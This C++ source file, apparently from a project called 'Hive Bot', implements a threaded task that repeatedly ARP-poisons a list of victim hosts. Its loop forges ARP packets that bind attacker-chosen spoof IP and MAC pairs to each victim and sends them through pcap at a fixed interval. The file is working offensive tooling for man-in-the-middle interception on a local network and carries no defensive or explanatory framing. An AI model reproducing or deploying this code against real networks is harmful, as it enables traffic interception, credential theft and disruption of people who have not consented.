/*
 * Copyright (c) 2017 The Hive Bot project authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

/*
 * poison_task.h - Poison task implementation.
 *
 * Regularly ARP poisons a group of victims at a given interval.
 */

#include "poison_task.h"

#include <iostream>

namespace hive_bot {

PoisonTask::PoisonTask(std::unordered_map<char*, char*> victim_addresses,
                       std::unordered_map<char*, char*> spoof_addresses,
                       u_long sleep_duration) {
  victim_addresses_ = victim_addresses;
  spoof_addresses_ = spoof_addresses;
  sleep_duration_ = sleep_duration;
}

void PoisonTask::Loop() {
  std::unique_lock<std::mutex> lock(mutex_);
  running_ = true;
  const u_int packet_size = sizeof(EthernetHeader) + sizeof(ArpHeader);
  u_char packet_buffer[packet_size] = { 0 };

  while (running_) {
    for (auto& victim_address : victim_addresses_) {
      for (auto& spoof_address : spoof_addresses_) {
        char* victim_ip = victim_address.first;
        char* victim_mac = victim_address.second;
        char* spoof_ip = spoof_address.first;
        char* spoof_mac = spoof_address.second;

        WriteArp(packet_buffer, victim_mac, spoof_mac, spoof_mac, victim_mac,
                 spoof_ip, victim_ip);

        if (pcap_sendpacket(pcap, packet_buffer, packet_size) != 0) {
          std::cout << "Error sending packet: " << pcap_geterr(pcap);
          std::cout << std::endl;
          return;
        }
      }
    }

    std::this_thread::sleep_for(std::chrono::seconds(sleep_duration_));
  }

  std::cout << "Poison task stopped" << std::endl;
  running_ = false;
}

bool PoisonTask::IsRunning() {
  return running_;
}

bool PoisonTask::Start() {
  if (running_) {
    std::cout << "Task already running!" << std::endl;
    return false;
  }

  if (pcap == NULL) {
    std::cout << "You must first choose a valid device" << std::endl;
    return false;
  }

  task_thread_ = std::thread(&PoisonTask::Loop, this);
  return true;
}

void PoisonTask::Stop() {
  running_ = false;
  task_thread_.join();
}

} // hive_bot
